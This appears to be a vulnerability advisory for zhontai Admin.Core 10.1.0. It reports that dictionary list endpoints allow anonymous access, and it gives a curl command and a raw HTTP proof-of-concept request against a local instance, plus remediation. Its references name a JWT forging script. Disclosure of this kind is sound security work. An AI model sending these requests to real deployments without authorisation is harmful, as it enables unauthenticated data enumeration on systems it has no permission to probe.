# Admin.Core — Anonymous dictionary API information disclosure (AC-VULN-012)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Information Disclosure |
| CWE | CWE-200 |
| Authentication | None |
| Severity | Medium |

## Summary

`DictService.GetListAsync` / related APIs are `[AllowAnonymous]` and return dictionary data.

## Root cause

Anonymous attribute on dictionary list endpoints.

## Exploit / reproduction

```bash
curl -s -X POST 'http://127.0.0.1:18010/api/admin/dict/get-list' -H 'Content-Type: application/json' -d '["sex"]'
```


## PoC (Yakit)

```http
POST /api/admin/dict/get-list HTTP/1.1
Host: 127.0.0.1:18010
Content-Type: application/json

["sex"]
```

Expected: HTTP 200; success=true; dictionary entries returned

## Screenshots

Dynamic verify: anonymous dict get-list returns sex entries.

## Impact

Unauthenticated enumeration of configured dictionary/metadata.

## Remediation

Require authentication or restrict to non-sensitive public codes only.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
